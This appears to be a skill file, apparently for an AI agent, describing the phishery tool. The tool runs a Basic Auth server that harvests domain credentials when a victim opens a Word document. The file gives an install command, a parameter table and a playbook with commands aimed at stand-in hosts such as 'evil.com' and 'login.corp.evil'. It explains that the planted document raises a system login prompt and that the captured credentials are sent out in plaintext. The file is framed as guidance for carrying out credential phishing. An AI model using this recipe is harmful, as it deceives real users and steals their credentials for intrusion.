---
name: phishery-basicauth
description: "Document phishing to harvest domain credentials. Signals: phishing, social engineering, fake success status codes."
zh-signals: "phishery: 文档钓鱼收割域凭据。信号:钓鱼,社会工程,成功状态码伪装。"
when-to-use: >-
  Use when conducting credential phishing and you need to stand up a Basic Auth
  harvesting server for a document that triggers system authentication prompts.
---

# phishery

- Attack Category: C08 Phishing and Social Engineering
- Upstream Repository: https://github.com/ryhanson/phishery
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
go install github.com/ryhanson/phishery@latest
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `phishery -u https://evil.com -c cert.pem -k key.pem` | Stand up a Basic Auth phishing server |
| `-p 443` | Port |
| `-s 200` | Success status code spoofing |

## Attack Scenario Playbook

### Document Phishing to Harvest Domain Credentials

```bash
phishery -u https://login.corp.evil -c cert.pem -k key.pem
# Insert URL https://file.corp.evil/secret.docx into a Word doc → triggers a Basic Auth prompt, credentials are exfiltrated in plaintext
```

## Notes

Uses an Office document that opens a remote file to pop a system-level authentication prompt; the SSL certificate needs a trusted domain, and the credentials are obtained by base64-decoding them.
